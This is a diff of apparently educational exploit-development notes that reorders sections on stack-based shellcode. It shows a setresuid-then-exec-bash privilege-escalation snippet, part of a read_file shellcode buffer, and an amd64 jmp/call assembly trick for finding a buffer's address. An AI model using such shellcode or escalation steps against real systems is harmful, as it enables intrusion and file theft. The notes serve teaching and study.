@@ -16,39 +16,13 @@ os.setresuid(os.geteuid(), os.geteuid(), os.geteuid())
 os.execlp("bash", "bash")
 ```
 
-The following shellcode open a fixed file and then write its contents
-of to a file descriptor passed as first argument into the stack:
-
 ## Stack-based
 
 In this context you are to pratically programming with assembly
 into a buffer.
 
-
-### Retrieve buffer related address
-
-This below is an example in which we do a jmp and a call back, in this
-way we obtain from the stack the address from which the call is started:
-(the code is for ``amd64``)
-
-```asm
-    /* call write(1, 4196356, 3) */
-    jmp miao
-start:
-    pop rsi
-    push (SYS_write) /* 1 */
-    pop rax
-    push 1
-    pop rdi
-    push 50
-    pop rdx
-    syscall
-    
-    ret
-miao:    call start
-.ascii "miao\0"
-```
-(is inspired from the original [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html#article)).
+For example the following shellcode opens a fixed file and then write its contents
+of to a file descriptor passed as first argument into the stack:
 
 ```python
 # linux/x86/read_file - 84 bytes
@@ -148,6 +122,31 @@ buf += "\xcd\x80"                     # 0x00000051   2                     cd80 
 
 sys.stdout.write(buf)
 ```
+
+### Retrieve buffer related address
+
+This below is an example in which we do a jmp and a call back, in this
+way we obtain from the stack the address from which the call is started:
+(the code is for ``amd64``)
+
+```asm
+    /* call write(1, 4196356, 3) */
+    jmp miao
+start:
+    pop rsi
+    push (SYS_write) /* 1 */
+    pop rax
+    push 1
+    pop rdi
+    push 50
+    pop rdx
+    syscall
+    
+    ret
+miao:    call start
+.ascii "miao\0"
+```
+(is inspired from the original [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html#article)).
 
 ## ROP
 
